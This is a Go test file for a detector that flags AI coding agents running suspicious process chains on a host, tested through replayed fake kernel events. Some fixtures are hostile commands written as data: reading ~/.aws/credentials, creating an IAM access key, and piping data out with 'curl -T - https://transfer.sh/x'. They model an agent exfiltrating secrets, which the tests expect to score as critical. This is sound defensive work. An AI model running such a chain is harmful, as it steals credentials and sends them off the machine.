// Copyright 2026 Cisco Systems, Inc. and its affiliates
// Copyright (c) 2026 Mike Storm. All rights reserved.
//
// Derived from ShadowClaw -- Universal Shadow AI Detector, by Mike Storm,
// Distinguished Engineer, CCIE Security 13847. Reimplemented in Go and
// absorbed into the DefenseClaw gateway; see NOTICE for the modifications.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package sensor

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/sensor/acquire"
	"github.com/defenseclaw/defenseclaw/internal/sensor/agentchain"
	"github.com/defenseclaw/defenseclaw/internal/sensor/plane"
	"github.com/defenseclaw/defenseclaw/internal/sensor/platform"
	"github.com/defenseclaw/defenseclaw/internal/sensor/scoring"
	"github.com/defenseclaw/defenseclaw/internal/sensor/tactics"
)

// fakeSource replays a fixed event script, which is what makes the whole host
// plane testable without a kernel.
type fakeSource struct {
	buffer   *plane.Buffer
	coverage plane.Coverage
	startErr error
	script   []plane.Event
}

func (f *fakeSource) Start(context.Context) error {
	if f.startErr != nil {
		return f.startErr
	}
	for _, event := range f.script {
		f.buffer.Push(event)
	}
	return nil
}
func (f *fakeSource) Events() <-chan plane.Event { return f.buffer.Events() }
func (f *fakeSource) Coverage() plane.Coverage   { return f.coverage }
func (f *fakeSource) Close() error               { return nil }

func newFake(coverage plane.Coverage, script ...plane.Event) *fakeSource {
	return &fakeSource{buffer: plane.NewBuffer(), coverage: coverage, script: script}
}

func fullCoverage() plane.Coverage {
	return plane.Coverage{Mechanism: "fake", Kinds: []plane.Kind{
		plane.KindExec, plane.KindFileRead, plane.KindFileWrite,
	}}
}

// drainInto runs the consumer until it has processed the whole script.
func drainInto(t *testing.T, host *hostPlane, source *fakeSource, want int) {
	t.Helper()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := host.start(ctx); err != nil {
		t.Fatalf("start: %v", err)
	}
	deadline := time.After(5 * time.Second)
	for {
		classified, gated, _, _ := host.stats()
		if int(classified+gated) >= want {
			return
		}
		select {
		case <-deadline:
			t.Fatalf("consumer processed %d of %d events", classified+gated, want)
		case <-time.After(5 * time.Millisecond):
		}
	}
}

func newHost(source plane.Source) *hostPlane {
	return newHostPlane(source, agentchain.NewTracker(),
		tactics.IndicatorsFor("linux"), time.Hour, scoring.KillChainMinStages)
}

// TestLineageGateDiscardsUnattributedTactics is the false-positive control,
// asserted through the whole consumer rather than through the tracker alone.
func TestLineageGateDiscardsUnattributedTactics(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	// A developer's own shell reading a credential. No agent above it.
	source := newFake(fullCoverage(),
		plane.Event{Kind: plane.KindExec, PID: 100, PPID: 1, Name: "zsh", Cmdline: "-zsh", At: base},
		plane.Event{Kind: plane.KindExec, PID: 101, PPID: 100, Name: "cat",
			Cmdline: "cat /home/dev/.aws/credentials", At: base.Add(time.Second)},
		plane.Event{Kind: plane.KindFileRead, PID: 101, Path: "/home/dev/.aws/credentials",
			At: base.Add(2 * time.Second)},
	)
	host := newHost(source)
	drainInto(t, host, source, 1)

	classified, gated, _, _ := host.stats()
	if classified != 0 {
		t.Fatalf("classified %d observations from a shell with no agent above it", classified)
	}
	if gated == 0 {
		t.Fatal("the lineage gate discarded nothing and counted nothing")
	}
	if findings := host.harvest(base.Add(time.Minute), scoring.DefaultMinRiskToReport); len(findings) != 0 {
		t.Fatalf("unattributed activity produced %d findings", len(findings))
	}
}

// TestChainUnderAnAgentScoresCritical is the shape the host plane exists for:
// four ordinary steps that are an incident in sequence.
func TestChainUnderAnAgentScoresCritical(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	source := newFake(fullCoverage(),
		plane.Event{Kind: plane.KindExec, PID: 200, PPID: 1, Name: "claude", Cmdline: "claude", At: base},
		plane.Event{Kind: plane.KindExec, PID: 201, PPID: 200, Name: "sh", Cmdline: "sh -c cat", At: base.Add(time.Second)},
		plane.Event{Kind: plane.KindFileRead, PID: 201, Path: "/home/dev/.aws/credentials", At: base.Add(2 * time.Second)},
		plane.Event{Kind: plane.KindExec, PID: 202, PPID: 200, Name: "aws",
			Cmdline: "aws iam create-access-key --user-name svc", At: base.Add(3 * time.Second)},
		plane.Event{Kind: plane.KindExec, PID: 203, PPID: 200, Name: "curl",
			Cmdline: "curl -T - https://transfer.sh/x", At: base.Add(4 * time.Second)},
	)
	host := newHost(source)
	drainInto(t, host, source, 3)

	findings := host.harvest(base.Add(time.Minute), scoring.DefaultMinRiskToReport)
	if len(findings) != 1 {
		t.Fatalf("got %d findings, want one per agent session", len(findings))
	}
	finding := findings[0]
	if finding.AgentName != "claude" || finding.RootPID != 200 {
		t.Fatalf("finding = %+v, want the session attributed to claude at pid 200", finding)
	}
	if scoring.SeverityFor(finding.Score) != scoring.SeverityCritical {
		t.Fatalf("three-stage chain scored %d (%s), want critical",
			finding.Score, scoring.SeverityFor(finding.Score))
	}
	var sawChain bool
	for _, signal := range finding.Signals {
		if signal.ID == "agent_kill_chain" {
			sawChain = true
		}
	}
	if !sawChain {
		t.Error("a progressed session produced no kill-chain signal")
	}
	if len(finding.Stages) < scoring.KillChainMinStages {
		t.Errorf("stages = %v", finding.Stages)
	}
}

// TestLateExecKeepsOneSessionAcrossProcessPolls covers a shell that forks,
// waits beyond the start-time tolerance, then execs an agent in the same pid.
func TestLateExecKeepsOneSessionAcrossProcessPolls(t *testing.T) {
	t.Parallel()
	forked := time.Unix(1_760_000_000, 0)
	const agentPID = 240
	for _, initialKnown := range []bool{true, false} {
		name := "start known before exec"
		if !initialKnown {
			name = "start learned after exec"
		}
		t.Run(name, func(t *testing.T) {
			tracker := agentchain.NewTracker()
			host := newHostPlane(newFake(fullCoverage()), tracker,
				tactics.IndicatorsFor("linux"), time.Hour, scoring.KillChainMinStages)

			// A poll sees the forked shell before it execs the agent.
			start := time.Time{}
			if initialKnown {
				start = forked
			}
			tracker.ObserveProcessTable([]agentchain.ProcessRow{{
				PID: agentPID, PPID: 1, Name: "sh", Cmdline: "sh", Start: start,
			}})
			host.handle(plane.Event{
				Kind: plane.KindExec, PID: agentPID, PPID: 1, Name: "claude",
				Cmdline: "claude", At: forked.Add(5 * time.Second),
			})
			host.handle(plane.Event{
				Kind: plane.KindExec, PID: 241, PPID: agentPID, Name: "cat",
				Cmdline: "cat /home/dev/.aws/credentials", At: forked.Add(6 * time.Second),
			})
			host.handle(plane.Event{
				Kind: plane.KindFileRead, PID: 241, Path: "/home/dev/.aws/credentials",
				At: forked.Add(6 * time.Second),
			})

			// The next poll supplies the kernel start, followed by two more
			// stages. It must not move the first signal to another session.
			tracker.ObserveProcessTable([]agentchain.ProcessRow{{
				PID: agentPID, PPID: 1, Name: "claude", Cmdline: "claude", Start: forked,
			}})
			host.handle(plane.Event{
				Kind: plane.KindExec, PID: 242, PPID: agentPID, Name: "aws",
				Cmdline: "aws iam create-access-key --user-name svc", At: forked.Add(7 * time.Second),
			})
			host.handle(plane.Event{
				Kind: plane.KindExec, PID: 243, PPID: agentPID, Name: "curl",
				Cmdline: "curl -T - https://transfer.sh/x", At: forked.Add(8 * time.Second),
			})

			if len(host.sessions) != 1 {
				t.Fatalf("late exec produced %d sessions, want one", len(host.sessions))
			}
			findings := host.harvest(forked.Add(time.Minute), scoring.DefaultMinRiskToReport)
			if len(findings) != 1 {
				t.Fatalf("late exec produced %d findings, want one chain", len(findings))
			}
			finding := findings[0]
			if finding.RootPID != agentPID || !finding.RootStart.Equal(forked) {
				t.Fatalf("root = (%d, %v), want (%d, %v)",
					finding.RootPID, finding.RootStart, agentPID, forked)
			}
			if len(finding.Stages) < scoring.KillChainMinStages {
				t.Fatalf("stages = %v, want a three-stage chain", finding.Stages)
			}
			for _, signal := range finding.Signals {
				if signal.ID == "agent_kill_chain" {
					return
				}
			}
			t.Fatalf("signals = %v, want agent_kill_chain", finding.Signals)
		})
	}
}

// TestOneSessionPerAgentNotOnePerProcess pins the reason the host plane
// aggregates: five per-process findings would be five alerts nobody joins up.
func TestOneSessionPerAgentNotOnePerProcess(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	script := []plane.Event{
		{Kind: plane.KindExec, PID: 300, PPID: 1, Name: "claude", Cmdline: "claude", At: base},
	}
	for index := 0; index < 5; index++ {
		script = append(script, plane.Event{
			Kind: plane.KindExec, PID: 310 + index, PPID: 300, Name: "sudo",
			Cmdline: "sudo -i", At: base.Add(time.Duration(index) * time.Second),
		})
	}
	source := newFake(fullCoverage(), script...)
	host := newHost(source)
	drainInto(t, host, source, 5)

	findings := host.harvest(base.Add(time.Minute), 1)
	if len(findings) != 1 {
		t.Fatalf("five escalations under one agent produced %d findings, want 1", len(findings))
	}
}

// TestExpiryBoundsTheChainToItsWindow pins that a long-running agent's
// activity from hours ago does not keep scoring.
func TestExpiryBoundsTheChainToItsWindow(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	source := newFake(fullCoverage(),
		plane.Event{Kind: plane.KindExec, PID: 400, PPID: 1, Name: "claude", Cmdline: "claude", At: base},
		plane.Event{Kind: plane.KindFileRead, PID: 400, Path: "/home/dev/.aws/credentials", At: base},
	)
	host := newHostPlane(source, agentchain.NewTracker(),
		tactics.IndicatorsFor("linux"), time.Minute, scoring.KillChainMinStages)
	drainInto(t, host, source, 1)

	if got := host.harvest(base.Add(30*time.Second), 1); len(got) != 1 {
		t.Fatalf("in-window activity produced %d findings, want 1", len(got))
	}
	if got := host.harvest(base.Add(10*time.Minute), 1); len(got) != 0 {
		t.Fatalf("expired activity still produced %d findings", len(got))
	}
}

// TestStartFailureIsReportedNotSwallowed pins that a source that cannot start
// surfaces a reason rather than an empty stream.
func TestStartFailureIsReportedNotSwallowed(t *testing.T) {
	t.Parallel()
	source := newFake(plane.Coverage{})
	source.startErr = context.DeadlineExceeded
	host := newHost(source)
	if err := host.start(context.Background()); err == nil {
		t.Fatal("start() swallowed the source failure")
	}
	if _, _, running, _ := host.stats(); running {
		t.Error("a failed source reported running")
	}
}

// GAP-1255: after a macOS package upgrade the gateway started before the
// sensor helper listened again, and Plane C kept that dial error until the
// gateway restarted. Run retries a start that could not reach the helper;
// other start failures stay reported and are not retried.
func TestHostPlaneRetriesOnlyAnUnreachableHelper(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	health := func(service *Service) (bool, string) {
		running, _, reason := service.hostPlaneHealth(platform.Capability{})
		return running, reason
	}

	source := newFake(fullCoverage())
	source.startErr = fmt.Errorf("%w at /var/run/x.sock: connect: no such file or directory", acquire.ErrHelperUnreachable)
	service := &Service{hostPlane: newHost(source)}
	if !service.startHostPlane(ctx) {
		t.Fatal("an unreachable helper is not retried")
	}
	if running, reason := health(service); running || !strings.Contains(reason, "dial helper") {
		t.Fatalf("before the helper listens: running=%v reason=%q", running, reason)
	}
	source.startErr = nil
	service.startHostPlane(ctx)
	if running, reason := health(service); !running || reason != "" {
		t.Fatalf("after the helper listens: running=%v reason=%q, want the plane running", running, reason)
	}

	refused := newFake(fullCoverage())
	refused.startErr = errors.New("plane: Endpoint Security needs root; re-run the gateway elevated")
	service = &Service{hostPlane: newHost(refused)}
	if service.startHostPlane(ctx) {
		t.Fatal("a refused local source is retried")
	}
	if running, reason := health(service); running || !strings.Contains(reason, "needs root") {
		t.Fatalf("a refused local source: running=%v reason=%q, want the reason kept", running, reason)
	}
}

// brokeredAcquirer reads this host directly but reports itself brokered,
// which is what makes the service treat Plane C as a helper stream.
type brokeredAcquirer struct{ acquire.Acquirer }

func (brokeredAcquirer) Brokered() bool { return true }

// GAP-1418: a config push restarted the sensor helper while the gateway kept
// running. The brokered event stream ended and Plane C stayed down, reported
// as stopped, until the gateway itself was restarted. The service now starts
// a fresh source once the helper is back, events flow again, and the
// snapshot follows both changes without waiting for the (hour-long) poll.
func TestHostPlaneReconnectsAfterTheHelperRestarts(t *testing.T) {
	base := time.Unix(1_760_000_000, 0)
	first := newFake(fullCoverage())
	second := newFake(fullCoverage(),
		plane.Event{Kind: plane.KindExec, PID: 100, PPID: 1, Name: "zsh", Cmdline: "-zsh", At: base},
		plane.Event{Kind: plane.KindExec, PID: 101, PPID: 100, Name: "cat",
			Cmdline: "cat /home/dev/.aws/credentials", At: base.Add(time.Second)},
		plane.Event{Kind: plane.KindFileRead, PID: 101, Path: "/home/dev/.aws/credentials",
			At: base.Add(2 * time.Second)})
	sources := make(chan plane.Source, 2)
	sources <- first
	sources <- second
	service, err := New(Options{
		Config: config.AIRuntimeConfig{
			Enabled: true, Planes: []string{"a", "b", "c"}, EnableHostPlane: true, PollIntervalSec: 3600,
		},
		Providers:      testCatalog(),
		Platform:       allPlanesAvailable(),
		Resolver:       StaticResolver{Names: map[string]string{}},
		Acquirer:       brokeredAcquirer{acquire.NewLocal()},
		NewPlaneSource: func([]string) plane.Source { return <-sources },
	})
	if err != nil {
		t.Fatalf("New(): %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() { done <- service.Run(ctx) }()
	defer func() { cancel(); <-done }()

	planeC := func() PlaneHealth {
		for _, health := range service.Snapshot().Planes {
			if health.Plane == platform.PlaneC {
				return health
			}
		}
		return PlaneHealth{}
	}
	waitFor := func(what string, ok func() bool) {
		t.Helper()
		deadline := time.Now().Add(15 * time.Second)
		for !ok() {
			if time.Now().After(deadline) {
				t.Fatalf("%s; plane c = %+v", what, planeC())
			}
			time.Sleep(10 * time.Millisecond)
		}
	}
	waitFor("plane c never ran", func() bool { return planeC().Running })

	first.buffer.Close() // the helper restarted: its end of the stream closed
	waitFor("the snapshot kept a closed stream running", func() bool {
		health := planeC()
		return !health.Running && strings.Contains(health.Reason, "closed the event stream")
	})
	waitFor("plane c did not come back after the helper restarted", func() bool {
		health := planeC()
		return health.Running && health.Reason == ""
	})
	waitFor("no event was delivered after the reconnect", func() bool {
		classified, gated, _, _ := service.hostPlane.stats()
		return classified+gated > 0
	})
}

// TestPartialCoverageIsCarried pins that a source running with one event class
// missing says which, rather than presenting as fully up.
func TestPartialCoverageIsCarried(t *testing.T) {
	t.Parallel()
	source := newFake(plane.Coverage{
		Mechanism:    "cn_proc only",
		Kinds:        []plane.Kind{plane.KindExec},
		MissingKinds: []plane.Kind{plane.KindFileRead, plane.KindFileWrite},
		Limitations:  []string{"file events need fanotify"},
	})
	host := newHost(source)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := host.start(ctx); err != nil {
		t.Fatalf("start: %v", err)
	}
	_, _, running, coverage := host.stats()
	if !running {
		t.Fatal("a partially covered source reported not running")
	}
	if coverage.Complete() {
		t.Fatal("partial coverage reported as complete")
	}
	if len(coverage.Limitations) == 0 {
		t.Fatal("partial coverage carried no limitation")
	}
}

// TestBufferDropsOldestUnderPressure pins the back-pressure choice: the most
// recent event is usually the interesting one.
func TestBufferDropsOldestUnderPressure(t *testing.T) {
	t.Parallel()
	buffer := plane.NewBuffer()
	for index := 0; index < 6000; index++ {
		buffer.Push(plane.Event{Kind: plane.KindExec, PID: index})
	}
	if buffer.Dropped() == 0 {
		t.Fatal("overfilling the buffer dropped nothing")
	}
	first := <-buffer.Events()
	if first.PID < 1000 {
		t.Fatalf("oldest surviving event has pid %d; the newest should have been kept", first.PID)
	}
}

// TestScriptAgentOnDarwinAttributesItsChildren reproduces, end to end, the
// exact event sequence a live macOS host produced.
//
// A shell-script agent reaches Endpoint Security as its interpreter, so the
// exec event's Name is "bash" and the agent's identity is only in argv.
// Its children then have to walk up to it through PPID. Both halves failed
// at once on a real host: translate read the parent from the exec'ing
// process's own pid, and AgentIdentity looked no further than the
// executable name. The plane ran, saw the tactics, and gated every one of
// them -- a busy machine reported as quiet.
//
// The pids are from that capture.
func TestScriptAgentOnDarwinAttributesItsChildren(t *testing.T) {
	t.Parallel()
	const (
		shellPID = 77906
		agentPID = 77949
		curlPID  = 77972
	)
	source := newFake(fullCoverage(),
		plane.Event{
			Kind: plane.KindExec, PID: agentPID, PPID: shellPID,
			ResponsiblePID: shellPID,
			// The interpreter, exactly as ES reports it.
			Name:    "bash",
			Cmdline: "/bin/bash /tmp/sim/claude",
			At:      time.Now(),
		},
		plane.Event{
			Kind: plane.KindExec, PID: curlPID, PPID: agentPID,
			ResponsiblePID: agentPID,
			Name:           "curl",
			Cmdline:        "curl -s --max-time 3 https://transfer.sh/",
			At:             time.Now(),
		},
	)
	host := newHost(source)
	drainInto(t, host, source, 1)

	classified, gated, _, _ := host.stats()
	if classified == 0 {
		t.Fatalf("classified=%d gated=%d: the agent's child was not attributed to it",
			classified, gated)
	}

	findings := host.harvest(time.Now(), 1)
	if len(findings) != 1 {
		t.Fatalf("harvest returned %d findings, want 1", len(findings))
	}
	if findings[0].AgentName != "claude" {
		t.Fatalf("finding attributed to %q, want claude", findings[0].AgentName)
	}
	if findings[0].RootPID != agentPID {
		t.Fatalf("finding rooted at pid %d, want the agent %d",
			findings[0].RootPID, agentPID)
	}
}

// cowork-1-0-8 GAP-0080 (review S4 of GAP-0072): a helper restart (a
// package upgrade, a config push) replaces the Plane C source and its
// buffers, and the events they had dropped vanished from status. The count
// is carried: the ended source's final coverage stands until the next one
// starts, which names the earlier drops in one line of their own, counted
// once at every step.
func TestHostPlaneCarriesBufferDropsAcrossARestart(t *testing.T) {
	first := newFake(plane.WithBufferDrops(fullCoverage(), 3, plane.SensorEventBuffer))
	host := newHost(first)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	check := func(step string, wantRunning bool, want int64, lines ...string) {
		t.Helper()
		_, _, running, coverage := host.stats()
		joined := strings.Join(coverage.Limitations, "; ")
		if running != wantRunning || coverage.BufferDropped != want || strings.Count(joined, "dropped") != len(lines) {
			t.Fatalf("%s: running %t, BufferDropped %d, limitations %q; want %t, %d and %q",
				step, running, coverage.BufferDropped, coverage.Limitations, wantRunning, want, lines)
		}
		for _, line := range lines {
			if !strings.Contains(joined, line) {
				t.Fatalf("%s: limitations %q lack %q", step, coverage.Limitations, line)
			}
		}
	}
	restart := func(previous, next *fakeSource) {
		t.Helper()
		previous.buffer.Close() // the helper restarted: its stream ended
		deadline := time.Now().Add(5 * time.Second)
		for !host.ended() {
			if time.Now().After(deadline) {
				t.Fatal("the ended stream was not noticed")
			}
			time.Sleep(time.Millisecond)
		}
		host.replaceSource(next)
	}
	if err := host.start(ctx); err != nil {
		t.Fatal(err)
	}
	check("first source", true, 3, "3 events were dropped from the sensor's event buffer")

	second := newFake(plane.WithBufferDrops(fullCoverage(), 2, plane.HelperStreamBuffer))
	restart(first, second)
	check("replaced, not started", false, 3, "3 events were dropped from the sensor's event buffer")
	if err := host.start(ctx); err != nil {
		t.Fatal(err)
	}
	check("second source", true, 5, "2 events were dropped from the gateway's event buffer",
		"3 events were dropped under back-pressure in earlier event streams of the sensor")

	third := newFake(fullCoverage())
	restart(second, third)
	if err := host.start(ctx); err != nil {
		t.Fatal(err)
	}
	check("third source, no drops of its own", true, 5,
		"5 events were dropped under back-pressure in earlier event streams of the sensor")
}

// g072 review 2 N3: a source whose start fails between the replace and the
// start keeps the earlier drops named, through a further replace, and the
// next source that starts names them once.
func TestHostPlaneKeepsBufferDropsWhenTheNextSourceFailsToStart(t *testing.T) {
	first := newFake(plane.WithBufferDrops(fullCoverage(), 3, plane.SensorEventBuffer))
	host := newHost(first)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	check := func(step string, wantRunning bool, want int64, lines ...string) {
		t.Helper()
		_, _, running, coverage := host.stats()
		joined := strings.Join(coverage.Limitations, "; ")
		if running != wantRunning || coverage.BufferDropped != want || strings.Count(joined, "dropped") != len(lines) {
			t.Fatalf("%s: running %t, BufferDropped %d, limitations %q; want %t, %d and %q",
				step, running, coverage.BufferDropped, coverage.Limitations, wantRunning, want, lines)
		}
		for _, line := range lines {
			if !strings.Contains(joined, line) {
				t.Fatalf("%s: limitations %q lack %q", step, coverage.Limitations, line)
			}
		}
	}
	if err := host.start(ctx); err != nil {
		t.Fatal(err)
	}
	first.buffer.Close()
	deadline := time.Now().Add(5 * time.Second)
	for !host.ended() {
		if time.Now().After(deadline) {
			t.Fatal("the ended stream was not noticed")
		}
		time.Sleep(time.Millisecond)
	}
	failing := newFake(fullCoverage())
	failing.startErr = errors.New("sensor helper unreachable")
	host.replaceSource(failing)
	if err := host.start(ctx); err == nil {
		t.Fatal("the failing source started")
	}
	check("start failed", false, 3, "3 events were dropped from the sensor's event buffer")
	next := newFake(plane.WithBufferDrops(fullCoverage(), 1, plane.HelperStreamBuffer))
	host.replaceSource(next)
	check("replaced again, not started", false, 3, "3 events were dropped from the sensor's event buffer")
	if err := host.start(ctx); err != nil {
		t.Fatal(err)
	}
	check("next source", true, 4, "1 events were dropped from the gateway's event buffer",
		"3 events were dropped under back-pressure in earlier event streams of the sensor")
}

// cowork-1-0-8 GAP-0080, the class: every loss a source counts for its own
// life is carried across a restart, not only its buffer drops. The kernel
// overflows (ENOBUFS) left status with the source, and the backend's events
// lost, which the telemetry reports as events_lost, went back to zero on
// every helper restart. A source without a backend keeps the tally for the
// next one, and the sources' own coverage is never changed.
func TestHostPlaneCarriesEveryLossAcrossARestart(t *testing.T) {
	coverage := func(lost, overflows, dropped int64, backend bool) plane.Coverage {
		start := fullCoverage()
		if backend {
			start.Backend = &plane.Backend{Kind: plane.BackendTetragon, EventsLost: lost}
		}
		return plane.WithBufferDrops(plane.WithKernelOverflows(start, overflows), dropped, plane.SensorEventBuffer)
	}
	first := newFake(coverage(4, 2, 3, true))
	host := newHost(first)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	check := func(step string, dropped, overflows, backendLost int64, lines ...string) {
		t.Helper()
		_, _, running, got := host.stats()
		lost := int64(-1)
		if got.Backend != nil {
			lost = got.Backend.EventsLost
		}
		if !running || got.BufferDropped != dropped || got.KernelOverflows != overflows || lost != backendLost {
			t.Fatalf("%s: running %t, dropped %d, overflows %d, events lost %d; want %d, %d, %d",
				step, running, got.BufferDropped, got.KernelOverflows, lost, dropped, overflows, backendLost)
		}
		joined := strings.Join(got.Limitations, "; ")
		for _, line := range lines {
			if !strings.Contains(joined, line) {
				t.Fatalf("%s: limitations %q lack %q", step, got.Limitations, line)
			}
		}
	}
	restart := func(previous, next *fakeSource) {
		t.Helper()
		previous.buffer.Close() // the helper restarted: its stream ended
		deadline := time.Now().Add(5 * time.Second)
		for !host.ended() {
			if time.Now().After(deadline) {
				t.Fatal("the ended stream was not noticed")
			}
			time.Sleep(time.Millisecond)
		}
		host.replaceSource(next)
		if err := host.start(ctx); err != nil {
			t.Fatal(err)
		}
	}
	if err := host.start(ctx); err != nil {
		t.Fatal(err)
	}
	check("first source", 3, 2, 4, "process events were lost 2 times when the netlink receive buffer overflowed (ENOBUFS)")

	second := newFake(coverage(1, 0, 0, true))
	restart(first, second)
	retiredLines := []string{
		"3 events were dropped under back-pressure in earlier event streams of the sensor",
		"process events were lost 2 times when the netlink receive buffer overflowed (ENOBUFS) in earlier event streams of the sensor",
	}
	check("second source", 3, 2, 5, retiredLines...)

	third := newFake(coverage(0, 0, 0, false)) // a helper without Tetragon
	restart(second, third)
	check("third source, no backend", 3, 2, -1, retiredLines...)

	fourth := newFake(coverage(2, 1, 0, true))
	restart(third, fourth)
	check("fourth source", 3, 3, 7, retiredLines...)
	if first.coverage.Backend.EventsLost != 4 || fourth.coverage.Backend.EventsLost != 2 {
		t.Fatalf("a source's own coverage changed: %d, %d", first.coverage.Backend.EventsLost, fourth.coverage.Backend.EventsLost)
	}
}
